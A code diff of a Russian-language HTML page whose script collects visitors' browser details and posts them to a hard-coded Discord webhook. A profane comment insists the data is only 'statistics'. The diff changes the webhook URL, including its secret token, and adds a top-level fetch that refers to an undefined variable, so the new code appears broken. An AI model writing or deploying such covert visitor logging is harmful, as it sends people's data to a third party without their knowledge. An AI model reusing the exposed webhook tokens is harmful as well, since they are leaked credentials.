@@ -33,7 +33,7 @@
     <noscript>Пожалуйста, включите JavaScript в вашем браузере для корректной работы сайта.</noscript>
     <div id="info"></div>
     <script>
-     const webhookUrl = "https://discord.com/api/webhooks/1105111457869336596/SUe8UVJCwIKP6K8KqLhfPcxTxS7a2X47dPO3H9Kean6LpxLxZhnFrPxVtKcUm1zmdBd9" /// Тот кто нахуй тронет этот вебхук выебу, я его использую для получения статистики, ваш не нужный айпи никому не идет. 
+     const webhookUrl = "https://discord.com/api/webhooks/1112425555200053389/P7vg6psaDL6d3ruOy_HD5kYnldsgYzg49245pQTQYqlgjUKOaFDiQVwLS1zOa2CwE5yo" /// Тот кто нахуй тронет этот вебхук выебу, я его использую для получения статистики, ваш не нужный айпи никому не идет. 
 
         let info = "<p>Имя браузера: " + navigator.appName + "</p>" +
             "<p>Версия браузера: " + navigator.appVersion + "</p>" +
@@ -82,16 +82,50 @@
               window.location.href = '/other-page.html';
           }
       });
-      function sendMessage(message) {
-          message = message.replace(/<[^>]*>/g, '\n');
-              fetch(webhookUrl, {
-                  method: 'POST',
-                  headers: {
-                      'Content-Type': 'application/json'
-                  },
-                  body: JSON.stringify({ content: message + '\n ----'})
-              });
-      }
+
+
+
+
+
+    const embed = {
+      title: 'Results',
+      description: message,
+      color: 0x00ff00
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({embeds: [embed]})
+    });
+
+
+
+
+
+
+    //  function sendMessage(message) {
+   //       message = message.replace(/<[^>]*>/g, '\n');
+    //          fetch(webhookUrl, {
+    //              method: 'POST',
+    //              headers: {
+    //                  'Content-Type': 'application/json'
+    //              },
+    //              body: JSON.stringify({ content: message + '\n ----'})
+    //          });
+   //   }
+
+
+
+
+
+
+
+
+
+
     </script>
 </body>
 </html>
